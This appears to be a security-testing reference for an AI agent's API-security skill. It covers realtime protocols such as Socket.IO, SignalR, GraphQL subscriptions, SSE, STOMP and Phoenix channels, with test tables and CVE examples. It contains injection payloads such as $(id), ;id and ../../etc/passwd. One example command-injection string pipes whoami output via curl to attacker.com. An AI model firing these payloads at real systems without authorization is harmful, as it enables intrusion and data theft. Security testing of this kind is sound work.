# Realtime Protocol Security Testing

> Referenced from [api-security SKILL.md](../SKILL.md) — detailed testing procedures for WebSocket frameworks (Socket.IO, SignalR), GraphQL subscriptions, SSE, STOMP, and transport-parity testing. Load when the target uses realtime features, WebSocket connections, or Server-Sent Events.

## Table of Contents

- [Key CVEs & Real-World Examples](#key-cves--real-world-examples)
- [Socket.IO Security](#socketio-security)
- [SignalR Security](#signalr-security)
- [GraphQL Subscription Security](#graphql-subscription-security)
- [Server-Sent Events (SSE)](#server-sent-events-sse)
- [STOMP / ActionCable / Phoenix Channels](#stomp--actioncable--phoenix-channels)
- [Transport Parity Testing](#transport-parity-testing)
- [Room / Channel / Topic Authorization](#room--channel--topic-authorization)
- [Token Management in Long-Lived Connections](#token-management-in-long-lived-connections)
- [WebSocket Message → Server-Side Execution](#websocket-message--server-side-execution)

---

## Key CVEs & Real-World Examples

| CVE | Product | Type | CVSS | Impact |
|-----|---------|------|------|--------|
| CVE-2026-1731 | BeyondTrust RS/PRA | WS handshake → OS cmd injection | 9.9 | Pre-auth RCE via `remoteVersion` bash arithmetic in thin-scc-wrapper; variant of CVE-2024-12356 |
| CVE-2026-25253 | OpenClaw (Moltbot) | WS token exfil → RCE | 8.8 | `gatewayUrl` token exfil via crafted link → disable approvals → escape container → host RCE |
| CVE-2026-22689 | Mailpit | CSWSH → email interception | 6.5 | `CheckOrigin` returns true for all requests (gorilla/websocket); attacker page reads all emails in real-time |
| CVE-2026-30241 | Mercurius (Fastify GraphQL) | Subscription depth bypass | — | Query depth limits enforced on HTTP but not on WS subscriptions → DoS via deeply nested subscription (CVSS v4 2.7 per NVD; practical impact higher when chained) |
| CVE-2025-55315 | ASP.NET Core Kestrel | Chunked TE smuggling | 9.9 | Lone `\n` in chunk extension → desync between proxy and Kestrel; broader than WS-specific — affects any HTTP request path |
| CVE-2025-64530 | Apollo Federation (`@apollo/composition`) | Interface directive bypass | 7.5 | `@auth` on interface not inherited by implementing object types → query via fragment in Apollo Router bypasses access control |

**Pattern:** WebSocket endpoints are consistently the last to get security controls (auth, rate limiting, input validation) that HTTP endpoints already have. This is the core testing thesis.

---

## Socket.IO Security

Socket.IO adds multiplexing (namespaces), acknowledgments, and automatic transport fallback on top of WebSockets. Each feature creates attack surface.

### Architecture

```
Client ←→ [HTTP long-polling or WebSocket] ←→ Socket.IO Server
                    ↕
            Namespace: /admin, /chat, /notifications
                    ↕
            Rooms within namespace: room-123, user-456
```

### Test Patterns

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Namespace auth bypass** | Connect to `/admin` namespace without auth middleware | Server accepts connection — namespace middleware not applied or bypassable |
| 2 | **Transport downgrade** | Force HTTP long-polling (`?transport=polling`) instead of WebSocket | Polling uses HTTP requests that may bypass WS-specific auth; WAFs may not inspect polling payloads the same way |
| 3 | **EIO version downgrade** | Connect with `EIO=3` when server has `allowEIO3: true` for v2 client compat | Older Engine.IO protocol may have different CORS/Origin handling or accept connections the v4 path rejects |
| 4 | **Event name injection** | Send events with reserved names: `connect`, `connect_error`, `disconnect`, `disconnecting`, `newListener`, `removeListener` | Server-side handler confusion; reserved events processed as application events |
| 5 | **Acknowledgment handler abuse** | Send event with callback ID, capture ACK response | ACK responses may leak data not in the original event (e.g., full user object vs. summary) |
| 6 | **Origin / allowRequest bypass** | Check server `allowRequest` callback and WS `Origin` validation (not CORS — WS upgrades are not subject to preflight) | Server uses `allowRequest` for handshake validation; if missing or weak, any origin can connect |
| 7 | **Admin UI exposure** | Check for `@socket.io/admin-ui` at `/admin` or `/_admin` | Unprotected admin dashboard showing all connections, rooms, events in real-time |

### Socket.IO-Specific Quick Probes (5 minutes)

```
1. Connect to default namespace (/) — check if auth is enforced
2. List namespaces: try /admin, /internal, /debug, /metrics, /test
3. Check Origin: send WS upgrade with Origin: https://evil.com — does allowRequest/Origin check reject?
4. Check transport: use ?transport=polling to fall back to HTTP long-polling — different auth behavior?
5. Send event with callback: socket.emit("getUser", {id: "other-user-id"}, (data) => console.log(data))
```

### Detection in Recon

When you see these signals in proxy history or JS bundles:
- `io(` or `io.connect(` in JavaScript → Socket.IO client
- `/socket.io/?EIO=4&transport=` in network requests → Socket.IO handshake
- `socket.io.min.js` or `@socket.io/` in dependencies → confirm version

---

## SignalR Security

Microsoft SignalR (.NET) uses Hubs for server-client RPC. Authorization is decorator-based (`[Authorize]`) and commonly incomplete.

### Architecture

```
Client ←→ [WebSocket / SSE / Long-Polling] ←→ SignalR Hub
                    ↕
            Hub methods: SendMessage(), JoinGroup(), GetData()
                    ↕
            Groups: admin-group, org-123-users
```

### Test Patterns

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Hub method auth gap** | Invoke hub methods without `[Authorize]` decoration | Server executes method without auth check — common when devs protect some methods but not all |
| 2 | **Group membership abuse** | Invoke custom hub methods that call `Groups.AddToGroupAsync()` with attacker-chosen group name | If the hub exposes a group-join method without authorization, you receive admin/cross-tenant messages |
| 3 | **Streaming data leak** | Invoke streaming hub methods (`IAsyncEnumerable<T>`) with other users' parameters | Receive continuous stream of another user's data |
| 4 | **Skip negotiation** | Connect directly via WebSocket with `skipNegotiation=true`, bypassing the `/negotiate` POST | Direct WS connections may skip auth checks applied during negotiation |
| 5 | **Connection token reuse** | Capture `connectionToken` from POST `/negotiate` response, replay from different session | Token not bound to authenticated session — any holder can use the connection |
| 6 | **Auth expiry persistence** | Establish WS connection, wait for auth token to expire, invoke hub methods | Connection stays alive after token expires — check if `CloseOnAuthenticationExpiration` is configured |

### SignalR-Specific Quick Probes

```
1. Find /hub or /signalr endpoints in recon
2. POST /hub/negotiate?negotiateVersion=1 — capture connectionId + supported transports
3. Connect via WebSocket: wss://target/hub?id={connectionId}
4. Send: {"protocol":"json","version":1}\x1e  (handshake, \x1e = record separator)
5. Invoke: {"type":1,"target":"GetAllUsers","arguments":[]}\x1e
6. Try direct WS (skipNegotiation): wss://target/hub without negotiate step
```

### Detection in Recon

- `/hub`, `/signalr`, `/hubs/` in URL paths → SignalR
- `@microsoft/signalr` or `signalr.min.js` in JS bundles
- `/negotiate` endpoint with `connectionToken` in response
- `\x1e` (ASCII record separator) in WebSocket frames

---

## GraphQL Subscription Security

GraphQL subscriptions operate over WebSocket using the `graphql-transport-ws` subprotocol (modern `graphql-ws` library) or the deprecated `graphql-ws` subprotocol (legacy `subscriptions-transport-ws` library). The naming is notoriously confusing — the library and subprotocol names are swapped between generations. Authorization often diverges from query/mutation auth because subscriptions are persistent and server-push.

### Architecture

```
Client ←→ [WebSocket: graphql-transport-ws subprotocol] ←→ GraphQL Server
                    ↕
            Subscription: onMessageCreated(channelId: "...")
                    ↕
            Resolver pushes data on each event
```

### Test Patterns

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Subscription auth bypass** | Subscribe to events without auth token (or with expired token) in `connection_init` payload | Server accepts subscription — auth checked at query time but not subscription time |
| 2 | **Cross-user subscription** | Subscribe to another user's events: `subscription { onUserUpdate(userId: "other-id") { email, phone } }` | Receive other user's real-time updates — resolver doesn't check subscription-level authorization |
| 3 | **Subscription depth bypass** | Send deeply nested subscription the query depth limit should block | Depth limit only enforced on HTTP queries, not WS subscriptions (CVE-2026-30241 Mercurius pattern) |
| 4 | **Subscription flooding** | Open many concurrent subscriptions from single connection | No per-connection subscription limit — resource exhaustion |
| 5 | **Subscription ID reuse** | Send new `subscribe` message reusing an active subscription ID with different filter args | Modern protocol should close with `4409 Subscriber for ID already exists`; if server silently replaces the subscription, auth may not be re-validated for the new filter |
| 6 | **Legacy subprotocol downgrade** | Connect with `Sec-WebSocket-Protocol: graphql-ws` (legacy subprotocol, used by deprecated `subscriptions-transport-ws` library) | Legacy protocol may lack `connection_init` auth hooks that the modern `graphql-transport-ws` subprotocol enforces |
| 7 | **Federation subscription leak** | Subscribe through gateway to federated subgraph data | Gateway forwards subscription to subgraph without propagating auth context |
| 8 | **Directive bypass via fragment** | `subscription { ...on Subscription { protectedField } }` using inline fragment | `@auth` directive on field not checked when accessed through fragment (Apollo Federation CVE pattern) |

### graphql-transport-ws Protocol Handshake (Modern)

```
1. Connect WS to /graphql (or /subscriptions)
2. Send: {"type":"connection_init","payload":{"Authorization":"Bearer TOKEN"}}
3. Receive: {"type":"connection_ack"}
4. Send: {"id":"1","type":"subscribe","payload":{"query":"subscription { onNewMessage { id content sender } }"}}
5. Receive: {"id":"1","type":"next","payload":{"data":{"onNewMessage":{...}}}} (on each event)
```

### Legacy vs. Modern Protocol

| Feature | `subscriptions-transport-ws` (legacy library) | `graphql-ws` (modern library) |
|---------|-----------------------------------------------|-------------------------------|
| WS subprotocol | `graphql-ws` | `graphql-transport-ws` |
| Init message | `connection_init` | `connection_init` |
| Subscribe message | `start` | `subscribe` |
| Auth delivery | `connection_init` `payload` (often omitted by devs) | `connection_init` `payload` (client passes via `connectionParams` option) |
| Keepalive | `ka` (server → client only) | `ping`/`pong` (bidirectional) |
| **Test implication** | Try both subprotocol headers — server may accept legacy `graphql-ws` without auth hooks | |

### Detection in Recon

- `wss://target/graphql` or `/subscriptions` with WebSocket upgrade
- `Sec-WebSocket-Protocol: graphql-transport-ws` or `graphql-ws` in handshake
- `graphql-ws`, `subscriptions-transport-ws`, `@apollo/server` in dependencies

---

## Server-Sent Events (SSE)

SSE provides server-push over HTTP — no WebSocket upgrade needed. Auth gaps arise because SSE connections are long-lived HTTP GETs that browsers handle differently from regular requests.

### Test Patterns

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **SSE auth on connection only** | Connect to SSE endpoint, then invalidate session/token | Events keep flowing after auth revocation — server doesn't re-check per event |
| 2 | **Cross-origin SSE** | `new EventSource("https://target.com/events", {withCredentials: true})` from attacker origin | `EventSource` defaults to `withCredentials: false` (no cookies); if target sets `Access-Control-Allow-Origin` + `Allow-Credentials`, attacker reads authenticated events. Same-origin SSE always sends cookies. |
| 3 | **Event injection** | Inject `\n\ndata: ` or `\nevent: admin\n` into parameters reflected in SSE stream | Stream manipulation — CVE-2026-29085 (Hono) pattern |
| 4 | **Reconnection auth gap** | `EventSource` auto-reconnects with `Last-Event-ID` header after disconnect | Reconnection uses stale/no auth — server trusts `Last-Event-ID` without re-authenticating |
| 5 | **Channel/topic IDOR** | Change channel ID in SSE URL: `/events?channel=other-user-id` | Receive other user's event stream |
| 6 | **Event type filtering bypass** | Subscribe to `/events?type=admin` when you should only see `type=user` | Missing server-side event type authorization |
| 7 | **SSE vs. HTTP auth differential** | Compare auth enforcement on SSE endpoint vs. equivalent REST endpoint | SSE endpoint may not enforce the same middleware (common in Express.js where SSE routes bypass auth middleware) |

### SSE-Specific Quick Probes

```
1. Find SSE endpoints: look for text/event-stream Content-Type in responses
2. curl -N -H "Cookie: session=..." https://target.com/api/events
3. Test without cookies: curl -N https://target.com/api/events (auth check?)
4. Test cross-origin: EventSource from different origin (withCredentials:true) — check CORS headers
5. Test reconnect: kill connection, observe auto-reconnect behavior
```

### GraphQL over SSE

Modern GraphQL stacks increasingly use SSE for subscriptions via the `graphql-sse` library, avoiding WebSocket complexity. The `graphql-sse` protocol uses HTTP GET or POST with `text/event-stream` responses.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **SSE subscription auth** | Subscribe via SSE without auth headers | SSE endpoint may not enforce same auth as WS subscription path |
| 2 | **Single vs. Distinct connection mode** | Check if server uses "single connection" (one SSE stream, multiple subscriptions) or "distinct" (one SSE per subscription) | Single connection mode may have weaker per-subscription auth |
| 3 | **Transport parity** | Test same subscription via WS and SSE | Auth/depth limits may differ between transports |

### Detection in Recon

- `Content-Type: text/event-stream` in response headers
- `EventSource(` or `new EventSource(` in JavaScript
- `/events`, `/stream`, `/sse`, `/notifications/stream` in API paths
- `data:`, `event:`, `id:`, `retry:` fields in response body
- `graphql-sse` in dependencies → GraphQL over SSE

---

## STOMP / ActionCable / Phoenix Channels

### STOMP (Simple Text Oriented Messaging Protocol)

Used by Spring Boot (via Spring WebSocket + STOMP), RabbitMQ Web STOMP plugin.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Destination auth bypass** | `SUBSCRIBE\nid:sub-0\ndestination:/topic/admin-events\n\n\0` | Server doesn't validate subscription destination against user's permissions. Note: `/topic/`, `/queue/`, `/exchange/` are broker-specific conventions (e.g., RabbitMQ), not protocol-defined. |
| 2 | **Message spoofing** | `SEND\ndestination:/app/chat\ncontent-type:application/json\n\n{"from":"admin","msg":"..."}\0` | Server trusts client-provided `from` field without validation |
| 3 | **Spring `@MessageMapping` auth** | Invoke `@MessageMapping` methods that lack `@PreAuthorize` | Method executes without authorization — Spring WebSocket doesn't inherit Spring Security HTTP filters by default |
| 4 | **Broker relay injection** | Send STOMP frames targeting internal broker destinations (`/queue/`, `/exchange/`) | Direct access to message broker bypassing application logic |

### Rails ActionCable

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Connection auth bypass** | Connect without valid session; check if `reject_unauthorized_connection` is enforced in `ApplicationCable::Connection` | Connection accepted without auth — `connect` method doesn't call `reject_unauthorized_connection` |
| 2 | **Origin validation** | Connect from attacker origin; check `allowed_request_origins` configuration | Missing or overly broad origin allowlist in ActionCable config |
| 3 | **Channel subscribe without auth** | `{"command":"subscribe","identifier":"{\"channel\":\"AdminChannel\"}"}` | `subscribed` callback doesn't check `current_user` permissions |
| 4 | **Action invocation** | `{"command":"message","identifier":"...","data":"{\"action\":\"delete_user\",\"id\":123}"}` | ActionCable action methods lack authorization checks |
| 5 | **Turbo Streams cross-user** | Subscribe to `turbo_stream_from "user_#{other_id}"` | Receive other user's Turbo Stream updates (Rails 7+ Hotwire) |

### Phoenix Channels (Elixir)

Wire format below uses the default V2 JSON serializer array format: `[join_ref, ref, topic, event, payload]`.

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Topic join without auth** | `["1","1","admin:lobby","phx_join",{}]` | `join/3` callback returns `{:ok, socket}` without checking permissions |
| 2 | **Cross-channel event** | Send event to topic you haven't joined | Server processes event without topic membership validation |
| 3 | **Presence tracking leak** | Join public channel, observe `presence_diff` events | Presence list reveals user metadata (names, emails, status) for all connected users |

---

## Transport Parity Testing

The core systematic methodology: every security control must be tested across **all** transports the API supports.

### Methodology

```
For each security control (auth, rate limit, input validation, depth limit, CORS):
  1. Identify all transports: HTTP REST, GraphQL HTTP, WebSocket, SSE, gRPC
  2. Test the control on each transport independently
  3. Document which transports enforce the control and which don't
  4. Any gap is a finding — transport parity failures are consistently underreported
```

### Transport Parity Matrix (Template)

| Security Control | HTTP REST | GraphQL HTTP | WS (raw) | WS (Socket.IO) | WS (GraphQL sub) | SSE | gRPC |
|-----------------|-----------|-------------|----------|----------------|------------------|-----|------|
| Authentication | ? | ? | ? | ? | ? | ? | ? |
| Authorization (per-resource) | ? | ? | ? | ? | ? | ? | ? |
| Rate limiting | ? | ? | ? | ? | ? | ? | ? |
| Input validation | ? | ? | ? | ? | ? | ? | ? |
| Query depth limit | N/A | ? | N/A | N/A | ? | N/A | N/A |
| CORS / Origin check | ? | ? | ? | ? | ? | ? | N/A |
| Request logging / audit | ? | ? | ? | ? | ? | ? | ? |
| WAF rules | ? | ? | ? | ? | ? | ? | ? |

Fill `✓` (enforced), `✗` (not enforced), or `~` (partially enforced). Any `✗` next to a `✓` in the same row is a finding.

### High-Value Parity Gaps

| Gap Pattern | Why It Happens | Impact |
|-------------|----------------|--------|
| HTTP auth ✓, WS auth ✗ | WS connection established during auth session but never re-validates | Persistent unauthorized access after session expires |
| HTTP rate limit ✓, WS rate limit ✗ | Rate limiting middleware only wraps HTTP handlers | Unlimited message volume via WS (DoS, brute force) |
| HTTP WAF ✓, WS WAF ✗ | WAF inspects HTTP requests but not WS frames | Injection payloads delivered via WS bypass WAF entirely |
| GraphQL HTTP depth ✓, WS sub depth ✗ | Depth analyzer only runs on HTTP query handler | DoS via deeply nested subscriptions (CVE-2026-30241) |
| REST CORS ✓, SSE Origin ✗ | SSE endpoint doesn't set `Access-Control-Allow-Origin` restrictively | Cross-origin event stream reading |
| HTTP message size limit ✓, WS no limit | HTTP body size checked by proxy/framework, WS frames unchecked | Large WS messages cause OOM on server |
| HTTP backpressure ✓, WS slow consumer ✗ | HTTP request-response naturally limits flow; WS server queues messages for slow consumers | Memory exhaustion via slow-read WS client |

---

## Room / Channel / Topic Authorization

Multi-room systems (chat, collaboration, notifications) share a common authorization model that is frequently broken.

### Systematic Testing

```
1. Join your own room/channel/topic (Room A)
2. Attempt to join Room B (another user's private room)
   - Direct join by ID: room-{other-user-id}
   - Wildcard: room-*, room-#, room-all
   - Sequential ID: if room-123 is yours, try room-124
3. Send message to Room B without joining
   - Some frameworks allow messaging a room without subscribing
4. List available rooms without auth
   - Socket.IO: adapter.rooms, admin UI
   - SignalR: no built-in room listing, but custom hub methods may expose
5. Leave Room A, attempt to still receive Room A messages
   - Server may not clean up subscriptions on leave
6. Join Room A, escalate to Room B's messages via filter manipulation
   - Change room parameter mid-stream
```

### Authorization Models

| Model | How Auth Works | Common Flaw |
|-------|---------------|-------------|
| **Join-time check only** | Auth validated when client joins room | Token expires, client stays in room indefinitely |
| **Per-message check** | Each message delivery checks auth | Performance overhead leads devs to cache auth decisions (stale cache = bypass) |
| **Server-side room assignment** | Server assigns rooms, client can't choose | Client sends modified room join request, server doesn't reject unknown rooms |
| **Topic-based routing** | Wildcard topics like `user.*.updates` | Client subscribes to `user.#` (MQTT/AMQP wildcard) to receive all users' updates |

---

## Token Management in Long-Lived Connections

WebSocket and SSE connections outlive the auth tokens that established them. This creates a class of bugs around token lifecycle in persistent connections.

### Test Patterns

| # | Test | What to do | What to look for |
|---|------|-----------|-----------------|
| 1 | **Token expiry during connection** | Establish WS connection, wait for JWT to expire, send message | Message processed despite expired token — server validated token only at connect time |
| 2 | **Session invalidation during connection** | Establish WS connection, log out in another tab, send message | WS connection survives logout — server doesn't push session invalidation to WS |
| 3 | **Token refresh race** | During token refresh, send messages with old token on WS | Old token accepted during refresh window — no invalidation of previous token |
| 4 | **Password change no disconnect** | Change password, check if existing WS connections persist | WS connections not terminated on credential change — attacker maintains access |
| 5 | **Role change no re-auth** | Downgrade user's role, check if WS connection retains old role | Messages still processed at old privilege level until reconnection |
| 6 | **Multi-device session limit bypass** | Connect N+1 WS connections where session limit is N | WS connections not counted against session limits — bypass concurrent session restrictions |

### Severity Guidance

- Token expiry ignored on WS = **High** (persistent unauthorized access after session should have ended)
- Logout doesn't disconnect WS = **Medium-High** (attacker with stolen session maintains access)
- Role change not reflected on active WS = **High** (privilege persistence)
- Password change doesn't terminate WS = **High** (post-compromise persistence)

---

## WebSocket Message → Server-Side Execution

WebSocket messages that reach server-side command execution — the highest-severity realtime vulnerability class.

### Patterns

| Pattern | Example | CVE Reference |
|---------|---------|---------------|
| **Bash arithmetic in WS parameter** | WS handshake parameter used in `$(( ))` evaluation → arbitrary command | CVE-2026-1731 (BeyondTrust, CVSS 9.9) |
| **JSON message → eval/exec** | WS message JSON field passed to `eval()`, `exec()`, or template engine | Common in Node.js custom WS handlers |
| **STOMP destination → file path** | STOMP `destination` header used to construct file path on server | Path traversal → file read/write |
| **GraphQL subscription → resolver injection** | Subscription argument passed unsanitized to database query | SQLi/NoSQLi via subscription parameters |
| **WS message → system command** | Chat/terminal applications that execute client-provided commands | Command injection via message content |

### Testing Approach

```
1. Identify all WS message types the server accepts
2. For each field in each message type:
   a. Test injection payloads: ' OR 1=1--, $(id), {{7*7}}, ${7*7}
   b. Test path traversal: ../../etc/passwd, ..\..\windows\system32
   c. Test command injection: ;id, |id, `id`, $(id)
3. Monitor server-side effects (DNS callbacks, timing, error messages)
4. Pay special attention to WS handshake parameters — they often reach
   server-side processing before the connection is fully established
```

### BeyondTrust Pattern (CVE-2026-1731)

The `thin-scc-wrapper` component processed the `remoteVersion` value from the WebSocket handshake using bash arithmetic evaluation `$(( ))`. An attacker could inject shell commands into the version string:

```
# Normal: remoteVersion=1.2.3
# Attack: remoteVersion=$(curl attacker.com/$(whoami))
# Server evaluates: $(($(curl attacker.com/$(whoami))))
```

**Key insight:** WebSocket handshake parameters (query string, custom headers, protocol sub-header) are processed by server-side code **before** the WebSocket connection is established. This is pre-auth attack surface.

---

## Validation Gate — Realtime-Specific False Positives

| Looks Like a Bug | Why It Usually Isn't |
|---|---|
| WS connection accepts from any origin | Only a finding if cookie-based auth is used AND sensitive data flows over WS — token-in-first-message auth is immune to CSWSH |
| SSE endpoint doesn't restrict origin | Only matters if SSE carries auth-gated data AND CORS headers allow credentialed cross-origin requests (`EventSource` defaults to `withCredentials: false`) |
| GraphQL subscription returns public data to unauthenticated user | Only a finding if the data is supposed to be private — public event streams are by design |
| WS connection survives for hours | Long-lived connections are expected; only a finding if they survive auth revocation |
| No rate limiting on WS messages | Only a finding if you can demonstrate impact — DoS, brute force, or resource exhaustion |

**Severity calibration:** CSWSH → data exfil = High-Critical. CSWSH → RCE chain = Critical. Transport parity auth gap = High. Subscription cross-user data = High. Token expiry persistence = High. WS injection → RCE = Critical.
